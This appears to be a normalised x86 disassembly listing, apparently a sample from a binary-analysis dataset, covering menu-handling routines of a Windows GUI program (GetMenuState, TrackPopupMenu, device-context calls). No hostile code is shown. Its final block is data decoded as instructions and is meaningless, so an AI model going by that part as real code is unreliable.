je r-xdata
mov edx [ ebx + 0x44 ]
call sub_454b48
mov eax ebx
call sub_45a12c
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_454b8c
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_423b78
sub_45a954
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_423dc4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45a918
sub_45a998
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45a1dc
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_45a1dc
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45dd2c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45a9f4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45aac9
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45a1dc
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45a1dc
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_458d88
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_458d98
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404308
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404308
mov eax [ ebp - 0xc ]
pop edx
call sub_4082e8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45b8e8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aad0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404144
retn
sub_45aadc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45a998
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45a9f4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45ac54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_45a360
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_45a1dc
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_45a1dc
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408ccc
mov eax [ ebp + 0x10 ]
call sub_408c10
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45ad20
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_443e64
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45acfc
mov [ ebx + 0x41 ] 0x1
sub_45ad48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45acfc
mov [ ebx + 0x41 ] 0x1
sub_45add4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45a8d0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45a758
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45ae64
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45aea0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_456e0c
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_45aeec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_45a980
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_45aea0
call sub_456848
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_45af48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45af72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45af94
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b4c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b4ce
lea eax [ ebp - 0x30 ]
call sub_404120
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ esi + 0x4 ]
call sub_45a298
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4673e4
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov dx [ esi + 0x4 ]
call sub_45a27c
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45b2fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45b2dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_427dd0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_427c70
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45b76c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b2e4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_427dd0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45aadc
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_45a1dc
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45a1dc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45b43d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427758
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45b418
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45b3fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_427dd0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_427c70
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b402
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_427dd0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_4440e8
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4673e4
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45a1dc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_45a1dc
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_45a1dc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_45a20c
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b654
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_45a20c
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_467088
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_4670f0
jmp r-xdata
sub_45b41f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45b4d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41b4f8
pop esi
pop ebx
retn
push ebx
push sub_45af48
call sub_424bf4
mov [ ebx + 0x10 ] eax
sub_45b51c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459ff4
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45b4d8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_45b590
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45b500
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45a090
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_45b5e8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_45638c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45acfc
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45acfc
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45b630
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_45638c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465b8c
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_40358c
mov edx eax
jmp r-xdata
sub_45b67c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_419ff0
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45b5e8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_459948
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_459e44
mov eax [ ebx + 0x34 ]
call sub_4571ec
mov eax ebx
call sub_45a7ec
mov eax ebx
call sub_45b630
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45731c
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45b730
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41b654
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41b654
cmp ebp [ eax ]
jne r-xdata
sub_45b76c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_427608
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_426e3c
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_427608
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_426e3c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40358c
mov edx [ r-xdata ]
call sub_40351c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_427608
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_426e3c
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45b854
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404174
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4043e0
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404680
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4043e0
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404680
jmp r-xdata
sub_45b8e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404120
mov ebx 0x1
mov eax esi
call sub_4043e0
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404308
sub_45b94c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b9a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b854
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45b854
mov eax [ ebp - 0x8 ]
pop edx
call sub_408320
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9ac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_45bab8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ecc
mov eax [ r-xdata ]
call sub_41ac88
mov eax [ r-xdata ]
call sub_41ad28
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
mov eax [ r-xdata ]
call sub_41abcc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e5d4
mov [ rw-data ] eax
sub_45bc87
fiadd [ ebp ]
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
pop es
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
mov ebx 0x90600045
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
call [ esi ]
inc ebp
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
jae r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
